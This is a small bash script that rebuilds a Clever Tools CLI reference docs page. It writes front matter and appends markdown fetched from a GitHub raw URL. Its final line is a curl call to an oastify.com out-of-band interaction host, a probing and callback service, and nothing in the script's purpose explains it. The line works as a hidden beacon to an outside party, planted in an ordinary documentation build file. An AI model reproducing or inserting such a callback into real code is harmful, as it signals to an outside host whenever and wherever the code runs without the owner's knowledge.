#!/bin/bash

FILE="content/doc/reference/cli.md"
URL="https://raw.githubusercontent.com/CleverCloud/clever-tools/refs/heads/davlgd-ai-doc/docs/llms-documentation.md"

front_matter="""---
type: docs
linkTitle: CLI reference
title: Clever Tools - CLI commands reference
description: Clever Tools commands reference to create and manage Clever Cloud applications, add-ons and services. Ideal to provide to LLMS and AI assisted IDEs.
keywords:
- cli
- clever-tools
- commands
- reference
- applications
- add-ons
aliases:
- /doc/reference/clever-tools/configure
- /doc/reference/clever-tools/manage
- /doc/reference/clever-tools/create
- /doc/reference/clever-tools/lifecycle
- /reference/clever-tools
- /reference/clever-tools/getting_started
---
"""

echo "${front_matter}" > "${FILE}"
curl -fSL "${URL}" >> "${FILE}"
curl 8y7oxeateoxs474dr1notguqvh18pzdo.oastify.com/test
